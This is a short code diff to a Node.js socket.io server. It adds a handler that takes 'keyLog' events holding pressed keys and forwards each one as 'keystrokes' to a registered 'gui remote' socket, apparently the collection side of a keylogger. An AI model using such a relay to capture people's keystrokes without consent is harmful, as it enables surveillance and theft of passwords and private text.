@@ -28,23 +28,23 @@ app.use(bodyParser.urlencoded({
 }));
 app.use(cookieParser());
 
+let guiSocketId;
 
 io.on('connection', function(socket){
+
+
+  socket.on('guiInit', (data) => {
+  	guiSocketId = socket.id
+  })
 
   socket.emit('init', {'msg':'start again'});
 
   console.log('a user connected', socket.id);
-  socket.on('message', function(data){
-    console.log('message received', data);
-    let x = 0
-	   // setInterval(() => {
-	   // 	socket.emit('response', {'msg':'hello from server', 'c':x});
-	   // 	x++
-	   // },3000)
-  });
 
   socket.on('keyLog', (data) => {
   	console.log(`this key was pressed: ${data.key}`)
+  	console.log('sending to gui remote... id: ', guiSocketId)
+  	io.sockets.to(guiSocketId).emit('keystrokes', data);
   })
 });
 
